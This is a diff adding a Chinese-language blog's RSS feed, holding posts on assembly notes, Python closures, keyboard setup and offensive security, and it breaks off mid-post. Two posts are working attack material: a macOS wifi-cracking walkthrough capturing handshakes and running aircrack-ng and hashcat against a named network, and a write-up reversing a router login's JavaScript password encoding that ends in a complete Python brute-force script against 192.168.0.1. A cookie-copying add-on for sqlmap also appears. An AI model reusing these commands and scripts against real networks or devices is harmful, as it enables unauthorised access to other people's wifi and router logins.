@@ -1,0 +1,1008 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
+  <channel>
+    <title>quanyechavshuo</title>
+    <description>A blog about programming and network security</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sat, 01 Jul 2017 23:33:17 +0800</pubDate>
+    <lastBuildDate>Sat, 01 Jul 2017 23:33:17 +0800</lastBuildDate>
+    <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>xlearn</title>
+        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录安全界大牛分享经验 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/xlearn&quot;&gt;gitlink&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/xlearn/master/tk%E6%95%99%E4%B8%BB.jpg&quot; /&gt;
+&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/xlearn/master/yuange.png&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 01 Jul 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/auxilary/2017/07/01/xlearn/</link>
+        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/07/01/xlearn/</guid>
+        
+        <category>经验</category>
+        
+        <category>大牛经验</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
+    
+      <item>
+        <title>汇编指令备忘录</title>
+        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录易忘汇编指令经典解释
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
+
+&lt;p&gt;1.&lt;a href=&quot;http://www.fx115.net/qa-220-122690.aspx&quot;&gt;movsz/movsx&lt;/a&gt;&lt;br /&gt;
+2.&lt;a href=&quot;http://baike.baidu.com/link?url=LW99HgDBFHx3Ao2Ep1JshAbaQT5O3QqsLqZYhi_a1mJ1tFPXc-S1Y9-JRmYKJQjXn0hR7vO6tIDDzXicIDLnrq&quot;&gt;lodsb/lodsw[stosb/stosw]&lt;/a&gt;&lt;br /&gt;
+3.&lt;a href=&quot;http://bbs.bccn.net/thread-327979-1-1.html&quot;&gt;cdq&lt;/a&gt; &lt;a href=&quot;https://zhidao.baidu.com/question/576311402.html&quot;&gt;cdq-more&lt;/a&gt;&lt;br /&gt;
+4.&lt;a href=&quot;http://baike.baidu.com/link?url=CT8ZZrc7HIQuiY5exSQr0uESH2sipINbLQr4APzLt8x2JRGo4mqTYw-NA6MigqE83mCndW2EhKDmUqRk-4io5_&quot;&gt;neg&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 29 Jun 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/06/29/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</link>
+        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/06/29/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
+        
+        <category>汇编指令</category>
+        
+        <category>备忘</category>
+        
+        
+        <category>二进制</category>
+        
+      </item>
+    
+      <item>
+        <title>python子函数使用主函数变量</title>
+        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python中子函数使用主函数变量方法
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;子函数对主函数中的tmpvalue相当于复制,不是引用,下面子函数中只能读到主函数中的tmpvalue,不能修改主函数的tmpvalue
+
+def mainfunc(folder, ext_list):
+    tmpvalue=2 
+    tmpvalueList = [&quot;3&quot;]
+
+    def subfunc():
+        print(tmpvalue)
+        tmpvalue+=1
+        print(tmpvalue)
+        print(tmpvalueList)
+        tmpvalueList[0]=(&quot;4&quot;)
+        print(tmpvalueList)
+    subfunc()
+mainfunc(1,2)
+
+------output------
+Traceback (most recent call last):
+  File &quot;3.py&quot;, line 13, in &amp;lt;module&amp;gt;
+    mainfunc(1,2)
+  File &quot;3.py&quot;, line 12, in mainfunc
+    subfunc()
+  File &quot;3.py&quot;, line 6, in subfunc
+    print(tmpvalue)
+UnboundLocalError: local variable 'tmpvalue' referenced before assignment
+------output------
+
+但是子函数中可以对主函数中的数组写,比变量功能强大,子函数可以改变主函数中的tmpvalueList
+
+def mainfunc(folder, ext_list):
+    tmpvalue=2 
+    tmpvalueList = [&quot;3&quot;]
+
+    def subfunc():
+        print(tmpvalue)
+        #tmpvalue+=1
+        #print(tmpvalue)
+        print(tmpvalueList)
+        tmpvalueList[0]=(&quot;4&quot;)
+        print(tmpvalueList)
+    subfunc()
+mainfunc(1,2)
+
+-------output-------
+2
+['3']
+['4']
+-------output-------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Fri, 09 Jun 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/python/2017/06/09/python%E5%AD%90%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E4%B8%BB%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F/</link>
+        <guid isPermaLink="true">http://localhost:4000/python/2017/06/09/python%E5%AD%90%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E4%B8%BB%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F/</guid>
+        
+        <category>python</category>
+        
+        
+        <category>python</category>
+        
+      </item>
+    
+      <item>
+        <title>wifi crack in macOS</title>
+        <description>&lt;h3 id=&quot;0x00-必读link&quot;&gt;0x00 必读link&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://gist.github.com/victorreyesh/6532800
+https://www.aircrack-ng.org/install.html
+https://apple.stackexchange.com/questions/117843/equivalent-of-airodump-ng-for-max-os-x
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-airport&quot;&gt;0x01 airport&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name &quot;airport&quot;
+airport -s
+    root in ~ λ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
+                                SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
+                                zhen d8:c8:e9:02:74:08 -83  4       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
+                           @Hos-WiFi 94:b4:0f:73:7a:72 -88  44,+1   Y  -- NONE
+                   HHT_10_2_229_225_ ac:cf:23:8c:70:b8 -44  11      Y  TW WPA2(PSK/AES/AES)
+                                 www 50:bd:5f:6e:3f:44 -68  11,-1   Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
+                          ziroom-11F b8:f8:83:d8:4a:2b -40  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)   
+
+(target=www)
+airport en1 sniff 11(en1 is the wifi netcard)
+wait...(find / -name &quot;*.cap&quot;,/tmp/*.cap exists)
+aircrack-ng -w ......./pass.txt -b 50:bd:5f:6e:3f:44 /tmp/*.cap
+    或者将cap文件转成hashcat支持的格式再用hashcat破解:
+    a.将https://github.com/hashcat/hashcat-utils/releases里面的cap2hccapx.bin放到kali64(vm)下运行得到hccapx文件,然后再运行:
+    b.hashcat -a 3 -m 2500 output.hccapx ?d?d?d?d?d?d?d?d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.aircrack-ng官网说airodump-ng和aireplay-ng在macOS不支持
+    airodump-ng可以看到已经建立的wifi连接
+    aireplay-ng可以主动攻击wifi,上面的airport en1 sniff 只能被动等待有人连接wifi
+    ---detail...
+    &quot; Mind you, airodump-ng and aireplay-ng are linux only and will not work under OSX native, so for reinjecting
+     and sniffing you will have to use other means.
+
+     If you have an intel Mac check out the VMware Fusion option which is mentioned lower on this page.&quot; 
+
+     也即,目前macOS sierra下只好较被动的用airport sniff命令较长时间以保证期间有handshake,不可主动攻击
+
+2.KisMac2不支持macOS sierra,目前新版本的macOS只能用上面的airport的被动方法crack wifi,除非找到了airodump-ng和
+aireplay-ng的替代品
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03-xwifi&quot;&gt;0x03 xwifi&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;以上自动化脚本成xwifi如下
+https://github.com/3xp10it/xwifi/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Tue, 06 Jun 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/06/06/wifi-crack-in-macOS/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/06/06/wifi-crack-in-macOS/</guid>
+        
+        <category>wifi</category>
+        
+        <category>crack</category>
+        
+        <category>macOS</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>firefox addons--复制cookie附加组件开发</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:制作一个火狐附加组件
+用途:用于在跑sqlmap或其他场景中时方便地提供cookie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-refer&quot;&gt;0x01 Refer&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.入门
+https://developer.mozilla.org/zh-CN/Add-onso
+2.api
+https://developer.mozilla.org/zh-CN/Add-ons/WebExtensions
+3.示例
+https://developer.mozilla.org/en-US/Add-ons/WebExtensions/Examples
+4.发布
+https://developer.mozilla.org/en-US/Add-ons/WebExtensions/Publishing_your_WebExtension
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-detail&quot;&gt;0x02 Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.最后代码如下:
+https://github.com/3xp10it/copyCookie
+
+2.关键代码如下,用于获取当前标签页面中的所有cookie
+
+--------------cookie.js----------------
+function showCookiesForTab(tabs) {
+  //get the first tab object in the array
+  tab = tabs.pop();
+
+  //get all cookies in the domain
+  var gettingAllCookies = browser.cookies.getAll({url: tab.url});
+  gettingAllCookies.then((cookies) =&amp;gt; {
+    if (cookies.length &amp;gt; 0) {
+      var returnCookie=&quot;&quot;;
+      for (cookie of cookies) {
+        var content = cookie.name + &quot;=&quot;+ cookie.value+&quot;;&quot;;
+        returnCookie=returnCookie+content;
+      }
+      returnCookie=returnCookie.substr(0,returnCookie.length-1);
+       //alert(returnCookie);
+        document.getElementById(&quot;output&quot;).innerHTML=returnCookie;
+        var copyText=document.querySelector('#output');
+        copyText.select();
+
+        function copy1(){
+        document.getElementById(&quot;output&quot;).innerHTML=returnCookie;
+        var copyText=document.querySelector('#output');
+        copyText.select();
+        //console.log(copyText.value);
+        var res=document.execCommand(&quot;copy&quot;);
+        //console.log(res);
+        //alert(&quot;copyed to clipboard&quot;);
+        }        
+
+        function copy2(){
+        document.getElementById(&quot;output&quot;).innerHTML=&quot;--cookie='&quot;+returnCookie+&quot;'&quot;;
+        var copyText=document.querySelector('#output');
+        copyText.select();
+        //console.log(copyText.value);
+        var res=document.execCommand(&quot;copy&quot;);
+        //console.log(res);
+        //alert(&quot;copyed to clipboard&quot;);
+        }        
+
+        document.querySelector(&quot;#pureCookie&quot;).addEventListener(&quot;click&quot;,copy1);
+        document.querySelector(&quot;#sqlmapCookie&quot;).addEventListener(&quot;click&quot;,copy2);
+    } else {
+      var p = document.createElement(&quot;p&quot;);
+      var content = document.createTextNode(&quot;No cookies in this tab.&quot;);
+      var parent = cookieList.parentNode;
+
+      p.appendChild(content);
+      parent.appendChild(p);
+    }
+  });
+};
+
+//get active tab to run an callback function.
+//it sends to our callback an array of tab objects
+function getActiveTab() {
+  return browser.tabs.query({currentWindow: true, active: true});
+}
+getActiveTab().then(showCookiesForTab);
+--------------cookie.js----------------
+
+3.可用于复制cookie和sqlmap中要用到的cooie参数形式的cookie
+
+4.安装本附加组件方法
+    在firefox的附加组件搜索copy cookie to clipboard,安装即可
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03-attention&quot;&gt;0x03 Attention&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.上面的用于复制数据到系统剪切板的代码如果没有通过人工点击事件触发则无法成功复制数据到剪切板
+2.专门用于操作剪切板的强大js,上面代码中暂时没有用到.
+    https://github.com/zenorocha/clipboard.js
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Thu, 01 Jun 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/auxilary/2017/06/01/firefox-addons-%E5%A4%8D%E5%88%B6cookie%E9%99%84%E5%8A%A0%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91/</link>
+        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/06/01/firefox-addons-%E5%A4%8D%E5%88%B6cookie%E9%99%84%E5%8A%A0%E7%BB%84%E4%BB%B6%E5%BC%80%E5%8F%91/</guid>
+        
+        <category>addons</category>
+        
+        <category>firefox</category>
+        
+        <category>cookie</category>
+        
+        
+        <category>auxilary</category>
+        
+      </item>
+    
+      <item>
+        <title>记一次js加密后的http暴破</title>
+        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:爆破某个http登录页面
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.在登录页面填入123455提交后用burpsuite拦截,发现post数据如下:
+    {&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:{&quot;password&quot;:&quot;0KcgeXhc9TefbwK&quot;}}
+  说明浏览器加密表单中的密码字段后再提交,这样就不能直接用burpsuite等工具加载字典爆破了
+
+2.尝试找到加密的js
+    a)用chrome打开http://192.168.1.1登录页面,发现右键被禁用
+    b)打开开发者工具,按如下图1-5的顺序点击
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    c)在上一步最后的点击后看到的如下黄色高亮的那一行上单击左键(第2行)表示在这一行上下断点,下好断点后第2行会有蓝
+      色箭头出现表示已经下好断点在这行
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    d)先将所有的4行(断点在第2行)js整理下格式,在线整理js格式:
+        http://www.css88.com/tool/js_beautify/
+
+        整理后的js内容如下:
+        ---------------js----------------
+        function init() {
+            function f() {
+                setStyle(id(&quot;lgPwdNote&quot;), {
+                    visibility: &quot;visible&quot;
+                });
+                disInputTip($(&quot;#lgPwd ~ i.tip&quot;)[0], &quot;error&quot;)
+            }
+
+            function g(a) {
+                var d = &quot;16px&quot;,
+                    c = id(&quot;loginError&quot;);
+                switch (a) {
+                case ESYSLOCKEDFOREVER:
+                    window.top.location.reload();
+                    break;
+                case ESYSLOCKED:
+                    window.top.location.reload();
+                    break;
+                case EUNAUTH:
+                    a = $.authRltObj.time;
+                    a = void 0 == a ? e.cnt : a;
+                    if (e.cnt == a) break;
+                    a &amp;lt;= e.minTipCnt ? c.innerHTML = label.loginErrorTipH + a + label.loginErrorTipT : (c.innerHTML = label.loginPwdErr, d = &quot;35px&quot;);
+                    f();
+                    break;
+                case k:
+                    c.innerHTML = label.loginPwdErr;
+                    f();
+                    break;
+                case ESYSCLIENTFULL:
+                    b.disabled = !0, id(&quot;loginSub&quot;).disabled = !0, showCover(function (a) {
+                        var c;
+                        a.innerHTML = &quot;&amp;lt;p&amp;gt;&quot; + label.loginFull + &quot;&amp;lt;/p&amp;gt;&quot;;
+                        a = $(&quot;#Cover p&quot;);
+                        c = (document.documentElement.clientHeight - a[0].offsetHeight) / 2;
+                        a.css(&quot;marginTop&quot;, c - 0.3 * c)
+                    })
+                }
+                c.style.lineHeight = d;
+                0 &amp;lt; b.value.length &amp;amp;&amp;amp; setInputCursor(b)
+            }
+
+            function l() {
+                var a = id(&quot;loginFeg&quot;);
+                a.style.visibility = &quot;visible&quot; == a.style.visibility ? &quot;hidden&quot; : &quot;visible&quot;
+            }
+
+            function h() {
+                var a = id(&quot;lgPwd&quot;);
+                $.auth($.orgAuthPwd(a.value), function (b) {
+                    b == ENONE ? (a.value = &quot;&quot;, $.aundLg = !0, unloadLogin()) : g(parseInt(thRltObj.bHa$.authRltObj.code))
+                })
+            }
+            var k = &quot;PSWIlegal&quot;,
+                b = id(&quot;lgPwd&quot;),
+                e = {
+                    max: 1800,
+                    cnt: 20,
+                    minTipCnt: 3,
+                    timeout: 1E3
+                };
+            (function () {
+                var a = id(&quot;loginSub&quot;),
+                    d = id(&quot;pwdTipStr&quot;);
+                $(&quot;span.loginHelp&quot;)[0].onclick = l;
+                g(parseInt($.authRltObj.code));
+                a.onclick = h;
+                b.value = &quot;&quot;;
+                b.onkeyup = function (a) {
+                    a = a || window.event;
+                    if (13 == a.keyCode) return h()
+                };
+                b.onclick = function () {
+                    d.style.display = &quot;none&quot;
+                };
+                b.onblur = function () {
+                    0 == this.value.length &amp;amp;&amp;amp; (d.style.display = &quot;inline&quot;)
+                };
+                b.onkeydown = function (a) {
+                    setStyle(id(&quot;lgPwdNote&quot;), {
+                        visibility: &quot;hidden&quot;
+                    });
+                    disInputTip($(&quot;#lgPwd ~ i.tip&quot;)[0], &quot;null&quot;)
+                }
+            })()
+        }
+        init();
+        --------------end----------------
+    e)输入密码为123456后点击如下图中的暂停js执行按钮后再点击确定按钮
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js4.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    f)上一步中的确定按钮点击完成后点击下图中的step into next function按钮,点了2下就点不动了,变成了灰色
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js5.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    g)继续点暂停js执行按钮后再点确定,然后一直点step into next function按钮,点了10几下突然出现local变量
+    a:&quot;123456&quot;,这个正是在密码输入框输入的密码,这时js执行到function(a){return $.securityEncode(...)}这里,如下图:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    h)这时再点step out of current function按钮再点step into next function突然出现a为加密后的变量,如下图
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js7.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    i)说明关键的加密函数就是securityEncode,对应的局部代码为:
+    ---------------------js----------------------
+    securityEncode: function (a, b, c) {
+                var e = &quot;&quot;,
+                    f, g, h, k, l = 187,
+                    n = 187;
+                g = a.length;
+                h = b.length;
+                k = c.length;
+                f = g &amp;gt; h ? g : h;
+                for (var p = 0; p &amp;lt; f; p++) n = l = 187, p &amp;gt;= g ? n = b.charCodeAt(p) : p &amp;gt;= h ? l = a.charCodeAt(p) : (l = a.charCodeAt(p), n = b.charCodeAt(p)), e += c.charAt((l ^ n) % k);
+                return e
+            }, orgAuthPwd: function (a) {
+                return $.securityEncode(&quot;RDpbLfCPsJZ7fiv&quot;,
+                    a, &quot;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&quot;)
+            }
+    ---------------------js----------------------
+
+    人工转成python代码如下:
+    -----------------python----------------
+    def securityEncode(a,b,c):
+        e=&quot;&quot;
+        f=g=h=k=l=187
+        n=187
+        g=len(a)
+        h=len(b)
+        k=len(c)
+        if g&amp;gt;h:
+            f=g
+        else:
+            f=h
+        for p in range(0,f):
+            n=l=187
+            if p&amp;gt;=g:
+                n=ord(b[p])
+            else:
+                if p&amp;gt;=h:
+                    l=ord(a[p])
+                else:
+                    l=ord(a[p])
+                    n=ord(b[p])
+                e+=c[(l ^ n) % k]
+        return e
+    -----------------python----------------
+
+    最后写出爆破脚本如下:
+
+    ----------------crack.py----------------
+    import re
+    import time
+    import sys
+    from exp10it import post_requests
+    def securityEncode(a,b,c):
+        e=&quot;&quot;
+        f=g=h=k=l=187
+        n=187
+        g=len(a)
+        h=len(b)
+        k=len(c)
+        if g&amp;gt;h:
+            f=g
+        else:
+            f=h
+        for p in range(0,f):
+            n=l=187
+            if p&amp;gt;=g:
+                n=ord(b[p])
+            else:
+                if p&amp;gt;=h:
+                    l=ord(a[p])
+                else:
+                    l=ord(a[p])
+                    n=ord(b[p])
+                e+=c[(l ^ n) % k]
+        return e
+    def myEncode(a):
+        result=securityEncode(&quot;RDpbLfCPsJZ7fiv&quot;,a, &quot;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&quot;)
+        return result
+    dict=&quot;/var/root/mypypi/dicts/pass.txt&quot;
+    with open(dict,&quot;r+&quot;) as f:
+        i=0
+        for each in f:
+            time.sleep(0.5)
+            i+=1
+            mypass=re.sub(r&quot;\s$&quot;,&quot;&quot;,each)
+            mypass=myEncode(mypass)
+            data={&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:{&quot;password&quot;:&quot;%s&quot; % mypass}}
+            #print(data)
+            resp=post_requests(&quot;http://192.168.0.1&quot;,data,{}).text
+            #print(dir(resp))
+            #print(resp.text)
+            sys.stdout.write(&quot;you tried:%d\r&quot; % i)
+            sys.stdout.flush()
+            if re.search(r&quot;error_code&quot;,resp):
+                continue
+            else:
+                print(&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Congratulations!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)
+                print(each)
+                break
+    ----------------crack.py----------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)这里有2个js转python的关键地方:
+1.js中的charCodeAt转成python为ord函数,eg:
+    b.charCodeAt(p)转成python为ord(b[p])
+2.js中的charAt转成python为数组取下标,eg:
+    c.charAt((l ^ n) % k)转成c[(l ^ n) % k]
+
+b)也可直接由python执行js,可参考:google.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Wed, 24 May 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/05/24/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84http%E6%9A%B4%E7%A0%B4/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/05/24/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84http%E6%9A%B4%E7%A0%B4/</guid>
+        
+        <category>js</category>
+        
+        <category>crack</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>HHKB BT键盘设置</title>
+        <description>&lt;h3 id=&quot;0x00-购买&quot;&gt;0x00 购买&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.购买hhkb bt最终采用办法为萌购代购(没有信用卡无法自己在日亚上海淘,如果用别人的信用卡购买会被日亚认为是存在安全
+风险,需要发传真验证账户安全性,这是大坑)
+2.最终购买HHKB BT+几个键帽与拨键帽器一共花费2105rmb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x01-设置&quot;&gt;0x01 设置&lt;/h3&gt;
+
+&lt;h4 id=&quot;0xa-测试环境&quot;&gt;0xa 测试环境&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;系统:macOS sierra
+pc:imac
+keyboard:HHKB BT(无刻版)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/hhkb.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;0xb-detail&quot;&gt;0xb Detail&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.背面的6个开关设置2,3,6为打开,其余全部关闭
+
+2.HHKB BT不用安装键盘驱动,官网如下说法:
+    &quot;HHKB Mac-only driver installation on the Professional BT does not need.&quot;
+
+3.设置control键按下为control键,只按下一次为esc键(利于vim),原来的修饰键不变,在keyboard maestro中设置如下图即可(
+与imac自带的键盘的设置有一点不同,imac自带键盘的设置还需将caps设置为ctrl,具体可见
+http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/hhkb-ctr2esc.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4.快捷键
+    ctrl+a:到开头
+    ctrl+e:到结尾
+    ctrl+p:到开头
+    ctrl+n:到结尾
+    ctrl+b:左
+    ctrl+f:右
+    ctrl+w:向前删除一个单词
+    ctrl+h:向前删除一个字符
+    ctrl+d:向后删除一个字符
+    ctrl+u:向前删除所有
+    ctrl+k:向后删除所有
+    control+t:将当前光标下的字符与前一个字符互换
+
+    没有上下方向的快捷键,用keyboard maestro中设置的ctrl+command+j/k
